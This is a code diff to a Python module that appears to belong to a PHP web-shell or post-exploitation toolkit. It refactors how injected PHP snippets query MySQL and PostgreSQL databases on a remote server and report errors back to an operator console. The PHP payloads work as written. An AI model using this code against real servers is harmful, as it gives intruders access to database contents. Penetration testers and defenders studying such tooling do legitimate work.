@@ -24,16 +24,16 @@ class Console(Module):
         self.register_vectors(
             [
             PhpCode(
-              """if(mysql_connect("${host}","${user}","${passwd}")){$r=mysql_query("${query}");echo mysql_error();if($r){while($c=mysql_fetch_row($r)){foreach($c as $key=>$value){echo $value."${linsep}";}echo "${colsep}";}};mysql_close();}""",
+              """if(mysql_connect("${host}","${user}","${passwd}")){$r=mysql_query("${query}");if($r){while($c=mysql_fetch_row($r)){foreach($c as $key=>$value){echo $value."${linsep}";}echo "${colsep}";}};mysql_close();}echo "${errsep}".@mysql_error();""",
               name = 'mysql',
             ),
-            PhpCode("""$r=mysql_query("${query}");echo mysql_error();if($r){while($c=mysql_fetch_row($r)){foreach($c as $key=>$value){echo $value."${linsep}";}echo "${colsep}";}};mysql_close();""",
+            PhpCode("""$r=mysql_query("${query}");if($r){while($c=mysql_fetch_row($r)){foreach($c as $key=>$value){echo $value."${linsep}";}echo "${colsep}";}};mysql_close();echo "${errsep}".@mysql_error();""",
               name = "mysql_fallback"
             ),
-            PhpCode( """if(pg_connect("host=${host} user=${user} password=${passwd}")){$r=pg_query("${query}");if($r){while($c=pg_fetch_row($r)){foreach($c as $key=>$value){echo $value."${linsep}";}echo "${colsep}";}};pg_close();}""",
+            PhpCode( """if(pg_connect("host=${host} user=${user} password=${passwd}")){$r=pg_query("${query}");if($r){while($c=pg_fetch_row($r)){foreach($c as $key=>$value){echo $value."${linsep}";}echo "${colsep}";}};pg_close();}echo "${errsep}".@pg_last_error();""",
               name = "pgsql"
             ),
-            PhpCode( """$r=pg_query("${query}");if($r){while($c=pg_fetch_row($r)){foreach($c as $key=>$value){echo $value."${linsep}";} echo "${colsep}";}};pg_close();""",
+            PhpCode( """$r=pg_query("${query}");if($r){while($c=pg_fetch_row($r)){foreach($c as $key=>$value){echo $value."${linsep}";} echo "${colsep}";}};pg_close();echo "${errsep}".@pg_last_error();""",
               name = "pgsql_fallback"
             ),
             ]
@@ -50,28 +50,34 @@ class Console(Module):
     def _query(self, vector, args):
 
 
-        # Random generate a separator for columns and lines
+        # Randomly generate separators
         colsep = '----%s' % utils.strings.randstr(6)
         linsep = '----%s' % utils.strings.randstr(6)
+        errsep = '----%s' % utils.strings.randstr(6)
         args.update(
-            { 'colsep' : colsep, 'linsep' : linsep, }
+            { 'colsep' : colsep, 'linsep' : linsep, 'errsep' : errsep }
         )
 
         result = self.vectors.get_result(vector, args)
 
-        if result:
-            return [
-              line.split(linsep) for line
-              in result.replace(linsep + colsep, colsep).split(colsep) if line
-            ]
+        # If there is not errstr, something gone really bad (e.g. functions not callable)
+        if not errsep in result:
+            return {
+                    'error' : messages.module_sql_console.unexpected_response,
+                    'result' : []
+            }
+        else:
 
-        # If the result is none, prints error message about missing trailer
-        command_last_chars = utils.prettify.shorten(self.args['query'].rstrip(),
-                                                        keep_trailer = 10)
+            # Split result by errsep
+            result, error = result.split(errsep)
 
-        if (command_last_chars and command_last_chars[-1] != ';'):
-            log.warn(messages.module_sql_console.missing_sql_trailer_s % command_last_chars)
-
+            return {
+                'error' : error,
+                'result' : [
+                  line.split(linsep) for line
+                  in result.replace(linsep + colsep, colsep).split(colsep) if line
+                ]
+            }
 
     def run(self):
 
@@ -95,13 +101,12 @@ class Console(Module):
                     else 'SELECT USER();'
                 )
 
-        user = self._query(vector, self.args)
-        if not user:
-            log.warn(messages.module_sql_console.check_credentials)
-            return
+        result = self._query(vector, self.args)
+        if not result['result']:
+            return result
 
-        if user[0]:
-            user = user[0][0]
+        if result['result'][0]:
+            user = result['result'][0][0]
 
         # Console loop
         while True:
@@ -117,11 +122,22 @@ class Console(Module):
 
     def print_result(self, result):
 
-        if result == None:
+        if result['error']:
+            log.info(result['error'])
+
+        if result['result']:
+            Module.print_result(self, result)
+
+        elif not result['error']:
+
             log.warn('%s %s' % (messages.module_sql_console.no_data,
                                 messages.module_sql_console.check_credentials)
                     )
-        elif not result:
-            log.warn(messages.module_sql_console.no_data)
-        else:
-            Module.print_result(self, result)
+
+            command_last_chars = utils.prettify.shorten(
+                                    self.args['query'].rstrip(),
+                                    keep_trailer = 10
+            )
+
+            if (command_last_chars and command_last_chars[-1] != ';'):
+                log.warn(messages.module_sql_console.missing_sql_trailer_s % command_last_chars)
